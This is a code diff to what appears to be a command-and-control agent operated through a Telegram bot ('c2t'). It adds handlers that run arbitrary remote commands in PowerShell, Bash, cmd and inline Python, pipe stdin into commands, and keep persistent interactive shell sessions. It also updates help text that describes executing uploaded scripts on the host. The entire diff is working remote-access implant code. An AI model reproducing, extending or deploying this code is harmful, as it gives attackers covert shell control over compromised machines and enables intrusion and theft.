@@ -221,6 +221,16 @@ typedef enum {
   CMD_INFO,
   CMD_KILL,
   CMD_SHELL,
+  CMD_POWERSHELL,
+  CMD_BASH,
+  CMD_CMD,
+  CMD_PYTHON,
+  CMD_STDIN,
+  CMD_SESSION,
+  CMD_SESSION_START,
+  CMD_SESSION_IN,
+  CMD_SESSION_STOP,
+  CMD_SESSION_STATUS,
   CMD_RUNFILE,
   CMD_HELP
 } c2t_cmd_id_t;
@@ -284,7 +294,17 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"status", CMD_STATUS}, {"ping", CMD_STATUS},
   {"info", CMD_INFO}, {"sysinfo", CMD_INFO}, {"about", CMD_INFO}, {"start", CMD_INFO},
   {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
-  {"sh", CMD_SHELL}, {"shell", CMD_SHELL}, {"cmd", CMD_SHELL}, {"exec", CMD_SHELL}, {"terminal", CMD_SHELL}, {"bash", CMD_SHELL}, {"powershell", CMD_SHELL}, {"ps", CMD_SHELL}, {"run_cmd", CMD_SHELL}, {"run", CMD_SHELL},
+  {"sh", CMD_SHELL}, {"shell", CMD_SHELL}, {"terminal", CMD_SHELL}, {"exec", CMD_SHELL}, {"run_cmd", CMD_SHELL}, {"run", CMD_SHELL},
+  {"powershell", CMD_POWERSHELL}, {"ps", CMD_POWERSHELL}, {"pwsh", CMD_POWERSHELL},
+  {"bash", CMD_BASH},
+  {"cmd", CMD_CMD},
+  {"py", CMD_PYTHON}, {"python", CMD_PYTHON}, {"python3", CMD_PYTHON},
+  {"stdin", CMD_STDIN},
+  {"session", CMD_SESSION}, {"sh_session", CMD_SESSION}, {"shell_session", CMD_SESSION},
+  {"sh_start", CMD_SESSION_START}, {"session_start", CMD_SESSION_START}, {"shell_start", CMD_SESSION_START},
+  {"sh_in", CMD_SESSION_IN}, {"session_in", CMD_SESSION_IN}, {"session_input", CMD_SESSION_IN}, {"shell_in", CMD_SESSION_IN}, {"input", CMD_SESSION_IN},
+  {"sh_stop", CMD_SESSION_STOP}, {"session_stop", CMD_SESSION_STOP}, {"shell_stop", CMD_SESSION_STOP},
+  {"sh_status", CMD_SESSION_STATUS}, {"session_status", CMD_SESSION_STATUS}, {"shell_status", CMD_SESSION_STATUS},
   {"runfile", CMD_RUNFILE}, {"execfile", CMD_RUNFILE}, {"runscript", CMD_RUNFILE}, {"exec_file", CMD_RUNFILE}, {"run_file", CMD_RUNFILE}, {"script", CMD_RUNFILE},
   {"help", CMD_HELP}
 };
@@ -1548,6 +1568,99 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_POWERSHELL: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_run_powershell_and_send(arg);
+    break;
+  }
+
+  case CMD_BASH: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_run_bash_and_send(arg);
+    break;
+  }
+
+  case CMD_CMD: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_run_cmd_and_send(arg);
+    break;
+  }
+
+  case CMD_PYTHON: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_run_python_and_send(arg);
+    break;
+  }
+
+  case CMD_STDIN: {
+    const char *arg = get_command_argument(text);
+    if (!arg || !*arg) {
+      telegram_send_html(
+          "⚠️ <b>Usage:</b> <code>/stdin &lt;command&gt; | &lt;input&gt;</code>\n"
+          "<i>Execute command with standard input piped into it.</i>\n\n"
+          "<i>Example:</i> <code>/stdin grep keyword | line1\\nkeyword\\nline3</code>");
+    } else {
+      const char *pipe_sep = strchr(arg, '|');
+      if (pipe_sep) {
+        char cmd_part[512] = {};
+        size_t c_len = (size_t)(pipe_sep - arg);
+        if (c_len >= sizeof(cmd_part)) c_len = sizeof(cmd_part) - 1;
+        memcpy(cmd_part, arg, c_len);
+        cmd_part[c_len] = '\0';
+        const char *input_part = pipe_sep + 1;
+        while (*input_part && isspace((unsigned char)*input_part)) input_part++;
+        (void)c2t_shell_run_with_input_and_send(cmd_part, input_part);
+      } else {
+        (void)c2t_shell_run_with_input_and_send(arg, nullptr);
+      }
+    }
+    break;
+  }
+
+  case CMD_SESSION: {
+    const char *arg = get_command_argument(text);
+    if (!arg || !*arg) {
+      (void)c2t_shell_session_handle_command("help", nullptr);
+    } else {
+      char sub[64] = {};
+      const char *rest = nullptr;
+      while (*arg && isspace((unsigned char)*arg)) arg++;
+      size_t idx = 0;
+      while (*arg && !isspace((unsigned char)*arg) && idx + 1 < sizeof(sub)) {
+        sub[idx++] = *arg++;
+      }
+      sub[idx] = '\0';
+      while (*arg && isspace((unsigned char)*arg)) arg++;
+      rest = *arg ? arg : nullptr;
+      (void)c2t_shell_session_handle_command(sub, rest);
+    }
+    break;
+  }
+
+  case CMD_SESSION_START: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_session_handle_command("start", arg);
+    break;
+  }
+
+  case CMD_SESSION_IN: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_session_handle_command("in", arg);
+    break;
+  }
+
+  case CMD_SESSION_STOP: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_session_handle_command("stop", arg);
+    break;
+  }
+
+  case CMD_SESSION_STATUS: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_session_handle_command("status", arg);
+    break;
+  }
+
   case CMD_RUNFILE: {
     const char *arg = get_command_argument(text);
     if (!arg || !*arg) {
@@ -2232,9 +2345,17 @@ static void handle_command(const telegram_incoming_update_t *update,
 
     static const char shell_sec[] =
         "<b>Shell &amp; Script Execution:</b>\n"
-        "• <code>/sh &lt;command&gt;</code> (or <code>/cmd</code>, <code>/exec</code>, <code>/run</code>) - Execute shell command\n"
-        "• <code>/runfile &lt;path&gt; [args]</code> (or <code>/script</code>) - Execute local script file on host\n"
-        "• <b>Script Upload:</b> Send any script file (<code>.sh</code>, <code>.bat</code>, <code>.ps1</code>, <code>.py</code>) as document with caption <code>/run</code> to execute it\n\n";
+        "• <code>/sh &lt;command&gt;</code> - Execute command in default OS shell\n"
+        "• <code>/ps &lt;command&gt;</code> - Execute command in PowerShell\n"
+        "• <code>/bash &lt;command&gt;</code> - Execute command in GNU Bash\n"
+        "• <code>/cmd &lt;command&gt;</code> - Execute command in Command Prompt\n"
+        "• <code>/py &lt;code&gt;</code> - Execute inline Python code\n"
+        "• <code>/stdin &lt;cmd&gt; | &lt;input&gt;</code> - Execute command with stdin input\n"
+        "• <code>/runfile &lt;path&gt; [args]</code> - Execute script file on host\n"
+        "• <code>/sh_start [shell]</code> - Launch interactive session (<code>bash</code>, <code>ps</code>, <code>cmd</code>, <code>py</code>)\n"
+        "• <code>/sh_in &lt;input&gt;</code> - Send input to running interactive session\n"
+        "• <code>/sh_status</code> / <code>/sh_stop</code> - Check or terminate session\n"
+        "• <b>Script Upload:</b> Send any script file (<code>.sh</code>, <code>.bat</code>, <code>.ps1</code>, <code>.py</code>) as document with caption <code>/run</code>\n\n";
     if (h_off + sizeof(shell_sec) - 1 < sizeof(help_msg)) {
       memcpy(help_msg + h_off, shell_sec, sizeof(shell_sec) - 1);
       h_off += sizeof(shell_sec) - 1;
@@ -2274,6 +2395,16 @@ static int is_heavy_command(c2t_cmd_id_t cmd) {
   case CMD_FILEINFO:
   case CMD_UPLOAD:
   case CMD_SHELL:
+  case CMD_POWERSHELL:
+  case CMD_BASH:
+  case CMD_CMD:
+  case CMD_PYTHON:
+  case CMD_STDIN:
+  case CMD_SESSION:
+  case CMD_SESSION_START:
+  case CMD_SESSION_IN:
+  case CMD_SESSION_STOP:
+  case CMD_SESSION_STATUS:
   case CMD_RUNFILE:
   case CMD_LOGS:
   case CMD_RESTART:
